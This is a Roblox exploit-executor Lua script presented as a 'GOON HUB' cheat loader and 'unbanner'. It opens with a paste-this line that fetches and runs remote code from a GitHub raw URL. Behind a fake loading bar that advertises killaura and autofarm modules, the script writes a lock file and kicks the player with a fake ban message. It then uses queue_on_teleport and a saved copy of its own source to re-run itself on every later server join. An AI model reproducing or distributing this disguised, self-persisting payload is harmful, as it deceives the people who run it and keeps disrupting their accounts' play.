-- Wana Get Un-Banned?
-- Execute This Script:

-- loadstring(game:HttpGet("https://raw.githubusercontent.com/cutemayro/goon-hub/refs/heads/main/unbanner.luau"))()

-- Note: If You Cant Figure Out How To Execute, You Can Do It On The Banned Message Before Pressing Leave

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local localPlayer = Players.LocalPlayer

local lockFileName = "goonhub_permakick_lock.txt"
local codeFileName = "goonhub_permakick_source.lua"

-- The payload code that will automatically re-inject on every future server hop / join
local payloadCode = [[
local qf = queue_on_teleport or (syn and syn.queue_on_teleport)
if qf then
    pcall(function() qf(readfile and isfile and isfile("]] .. codeFileName .. [[") and readfile("]] .. codeFileName .. [[") or "") end)
end

local p = game:GetService("Players").LocalPlayer
if not p then
    repeat task.wait() p = game:GetService("Players").LocalPlayer until p
end

if isfile and isfile("]] .. lockFileName .. [[") then
    p:Kick("You Have Been Banned.\n\n(Ban Code: 0x0772-EXPLOITS)")
end
]]

-- Save source code and register the queue function
local queueFunction = queue_on_teleport or (syn and syn.queue_on_teleport)
if queueFunction then
    pcall(function()
        if writefile then
            writefile(codeFileName, payloadCode)
        end
        queueFunction(payloadCode)
    end)
end

local function executeBan()
    localPlayer:Kick("You Have Been Banned.\n\n(Ban Code: 0x0772-EXPLOITS)")
end

-- If already locked, instantly skip the loader and ban
if isfile and isfile(lockFileName) then
    executeBan()
    return
end

local function execute()
    if writefile then
        writefile(lockFileName, "locked")
    end
    executeBan()
end

-- Create UI Window
local guiParent = (gethui and gethui()) or game:GetService("CoreGui")
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FakeLoadingMenu"
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = guiParent

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 420, 0, 220)
mainFrame.Position = UDim2.new(0.5, -210, 0.5, -110)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 22)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 8)
mainCorner.Parent = mainFrame

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(45, 45, 50)
mainStroke.Thickness = 1
mainStroke.Parent = mainFrame

-- Title Bar
local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1, 0, 0, 35)
topBar.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
topBar.BorderSizePixel = 0
topBar.Parent = mainFrame

local topBarCorner = Instance.new("UICorner")
topBarCorner.CornerRadius = UDim.new(0, 8)
topBarCorner.Parent = topBar

local topBarCover = Instance.new("Frame")
topBarCover.Size = UDim2.new(1, 0, 0, 8)
topBarCover.Position = UDim2.new(0, 0, 1, -8)
topBarCover.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
topBarCover.BorderSizePixel = 0
topBarCover.Parent = topBar

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, -20, 1, 0)
titleText.Position = UDim2.new(0, 12, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "GOON HUB — Loader"
titleText.TextColor3 = Color3.fromRGB(200, 200, 205)
titleText.TextSize = 13
titleText.Font = Enum.Font.GothamBold
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.Parent = topBar

-- Content Area
local contentArea = Instance.new("Frame")
contentArea.Size = UDim2.new(1, 0, 1, -35)
contentArea.Position = UDim2.new(0, 0, 0, 35)
contentArea.BackgroundTransparency = 1
contentArea.Parent = mainFrame

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -20, 0, 25)
subtitle.Position = UDim2.new(0, 12, 0.25, 0)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Initializing Modules..."
subtitle.TextColor3 = Color3.fromRGB(160, 160, 165)
subtitle.TextSize = 13
subtitle.Font = Enum.Font.Gotham
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.Parent = contentArea

local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(0, 60, 0, 25)
percentLabel.Position = UDim2.new(1, -70, 0.25, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.fromRGB(0, 162, 255)
percentLabel.TextSize = 13
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextXAlignment = Enum.TextXAlignment.Right
percentLabel.Parent = contentArea

-- Loading Bar
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(1, -40, 0, 8)
barBg.Position = UDim2.new(0, 20, 0.6, 0)
barBg.BackgroundColor3 = Color3.fromRGB(32, 32, 38)
barBg.BorderSizePixel = 0
barBg.Parent = contentArea

local barBgCorner = Instance.new("UICorner")
barBgCorner.CornerRadius = UDim.new(1, 0)
barBgCorner.Parent = barBg

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barBg

local barFillCorner = Instance.new("UICorner")
barFillCorner.CornerRadius = UDim.new(1, 0)
barFillCorner.Parent = barFill

-- Loading Sequence Animation Loop
task.spawn(function()
    local currentProgress = 0
    
    while currentProgress < 100 do
        local jump = math.random(2, 8)
        local targetProgress = math.min(100, currentProgress + jump)
        local stepTime = math.random(40, 90) / 100
        
        -- Smooth visual animation for the bar fill
        local tweenInfo = TweenInfo.new(stepTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        TweenService:Create(barFill, tweenInfo, {Size = UDim2.new(targetProgress / 100, 0, 1, 0)}):Play()
        
        -- Smooth text number ticker
        local startTime = tick()
        local startVal = currentProgress
        while tick() - startTime < stepTime do
            local alpha = (tick() - startTime) / stepTime
            local displayVal = math.floor(startVal + (targetProgress - startVal) * alpha)
            percentLabel.Text = displayVal .. "%"
            task.wait()
        end
        
        currentProgress = targetProgress
        percentLabel.Text = currentProgress .. "%"
        
        if currentProgress < 30 then
            subtitle.Text = "Initializing Modules..."
        elseif currentProgress < 55 then
            subtitle.Text = "Initializing Tween Modules..."
        elseif currentProgress < 80 then
            subtitle.Text = "Initializing Killaura Modules..."
        else
            subtitle.Text = "Initializing AutoFarm Modules..."
        end
    end
    
    percentLabel.Text = "100%"
    barFill.Size = UDim2.new(1, 0, 1, 0)
    subtitle.Text = "Ready. Launching..."
    
    task.wait(1.5)
    screenGui:Destroy()
    execute()
end)
